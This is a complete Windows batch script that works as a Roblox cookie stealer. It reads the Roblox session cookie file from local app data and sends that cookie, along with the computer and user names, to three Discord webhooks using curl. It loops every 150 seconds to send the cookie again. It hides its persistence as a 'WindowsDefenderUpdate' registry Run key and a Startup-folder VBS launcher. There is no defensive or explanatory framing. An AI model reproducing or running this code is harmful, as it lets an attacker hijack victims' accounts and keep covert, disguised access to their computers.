@echo off
setlocal EnableDelayedExpansion

set "LOGS=https://discord.com/api/webhooks/1563118302715322368/9xgemSM8Sf-T3QMCNppQ10zpxz0CMjaGohxFCg6Hl8R0cVYB-ELK49meQbAfAtvS65Mt"
set "REGRAB=https://discord.com/api/webhooks/1563321942797455460/9VXQBvrcfwAk15eHsIy3B4i7B2AmU3N90UdnIAUP_ZM9sgrakO1jfjgPcbu1SJwzH9S_"
set "ONLINE=https://discord.com/api/webhooks/1563322005359689802/j8YrC7L0NiTS0Xr0EenAjLTUdEpn-GY0CMauHvjr877IA6JXsbd9kYpbUTGPkYMDJVda"

set "PC=%COMPUTERNAME%"
set "USER=%USERNAME%"
set "RC=%LOCALAPPDATA%\Roblox\LocalStorage\robloxcookies.dat"

:: --- PERSISTENCE ---
echo Set WShell = CreateObject("WScript.Shell") > "%TEMP%\vanta_launch.vbs"
echo WShell.Run """%~dp0%~nx0""", 0, False >> "%TEMP%\vanta_launch.vbs"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefenderUpdate /t REG_SZ /d "wscript.exe //B \"%TEMP%\vanta_launch.vbs\"" /f >nul
copy /Y "%TEMP%\vanta_launch.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs" >nul
:: ------------------

echo Sending initial logs...

set "cookie=No Roblox cookie found."
set "rawjson="

if exist "%RC%" (
    :: read whole file into one var, then pull the CookiesData field
    for /f "usebackq delims=" %%a in ("%RC%") do set "rawjson=!rawjson!%%a"
    for /f "tokens=2 delims=:" %%b in ("!rawjson!") do (
        set "tmp=%%b"
        set "tmp=!tmp:~1,-1!"
        set "cookie=!tmp!"
    )
)

curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Initial Log\",\"description\":\"Client: %PC% / %USER%\",\"color\":65280}]}" %LOGS%
curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Roblox CookiesData\",\"description\":\"```\n%cookie%\n```\",\"color\":65280}]}" %LOGS%
curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"User Online\",\"description\":\"Client: %PC% / %USER%\",\"color\":65280}]}" %ONLINE%

echo Script is now looping.
:loop
timeout /t 150 /nobreak >nul
if exist "%RC%" (
    set "rawjson="
    for /f "usebackq delims=" %%a in ("%RC%") do set "rawjson=!rawjson!%%a"
    for /f "tokens=2 delims=:" %%b in ("!rawjson!") do (
        set "tmp=%%b"
        set "tmp=!tmp:~1,-1!"
        set "cookie=!tmp!"
    )
    curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Regrab CookiesData\",\"description\":\"Client: %PC% / %USER%\n```\n%cookie%```\",\"color\":65280}]}" %REGRAB%
)
goto loop
